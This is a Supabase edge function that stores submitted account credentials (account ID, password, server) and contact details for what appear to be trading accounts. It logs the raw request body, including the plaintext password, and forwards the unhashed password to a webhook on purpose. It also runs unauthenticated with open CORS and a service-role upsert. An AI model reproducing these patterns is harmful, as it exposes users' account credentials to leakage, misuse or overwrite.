import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.53.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestBody = await req.json();
    console.log('Store user account request:', requestBody);

    // Initialize Supabase client with service role key for bypassing RLS
    const supabaseAdmin = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    const {
      firstName,
      lastName,
      email,
      phone,
      accountId,
      password,
      server,
      sessionId,
      referrerName,
      accountType
    } = requestBody;

    // Validate required fields
    if (!accountId || !password || !server) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Missing required fields: accountId, password, server'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        }
      )
    }

    // Hash the password before storing
    const { data: hashedPassword, error: hashError } = await supabaseAdmin.rpc('hash_password', {
      password: password
    });

    if (hashError) {
      console.error('Error hashing password:', hashError);
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Password processing failed'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      )
    }

    // Insert the user account
    const { data, error } = await supabaseAdmin
      .from('user_accounts')
      .upsert({
        account_id: accountId,
        account_password: hashedPassword,
        server_name: server,
        user_name: firstName && lastName ? `${firstName} ${lastName}` : (firstName || ''),
        email: email || null,
        phone: phone || null,
        referrer_name: referrerName || null,
        session_id: sessionId || null,
        status: accountType === 'live' ? 'pending' : 'active',
        created_at: new Date().toISOString()
      }, {
        onConflict: 'account_id'
      });

    if (error) {
      console.error('Error storing user account:', error);
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Database insertion failed'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      )
    }

    console.log('Successfully stored user account:', accountId);

    // Now call the webhook function to send notification
    try {
      const { data: webhookData, error: webhookError } = await supabaseAdmin.functions.invoke('send-account-webhook', {
        body: {
          account_id: accountId,
          account_password: password, // Send original password to webhook
          server_name: server,
          user_name: firstName && lastName ? `${firstName} ${lastName}` : (firstName || ''),
          email: email || null,
          phone: phone || null,
          referrer_name: referrerName || null,
          session_id: sessionId || null,
          account_type: accountType || 'demo'
        }
      });

      if (webhookError) {
        console.error('Webhook call failed:', webhookError);
        // Don't fail the main operation if webhook fails
      } else {
        console.log('Webhook sent successfully');
      }
    } catch (webhookErr) {
      console.error('Webhook error:', webhookErr);
      // Don't fail the main operation if webhook fails
    }

    return new Response(
      JSON.stringify({
        success: true,
        message: 'User account stored successfully',
        account_id: accountId
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    )

  } catch (error) {
    console.error('Store user account failed:', error);
    return new Response(
      JSON.stringify({
        success: false,
        error: error.message
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    )
  }
})